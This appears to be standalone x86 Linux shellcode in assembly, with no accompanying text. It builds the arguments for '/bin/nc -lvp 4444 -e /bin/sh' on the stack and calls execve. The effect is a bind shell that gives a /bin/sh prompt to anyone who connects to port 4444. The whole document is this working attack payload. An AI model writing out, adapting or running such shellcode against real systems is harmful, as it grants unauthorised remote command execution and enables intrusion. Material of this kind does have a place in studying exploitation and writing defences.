



;/bin/nc -lvp 4444 -e /bin/sh




global _start


section .text

_start:


    xor eax,eax
    xor edx,edx
    ;//bin/nc
    push eax
    push 0x636e2f6e
    push 0x69622f2f
    mov ebx,esp

    ;-lvp4444
    push eax
    push 0x34343434
    push 0x70766c2d
    mov esi,esp

    ;-e////bin/sh
    push eax
    push 0x68732f6e
    push 0x69622f2f
    push 0x2f2f652d
    mov edi,esp

    push edx
    push esi
    push edi
    push ebx
    mov ecx,esp
    mov al,0xb
    int 0x80




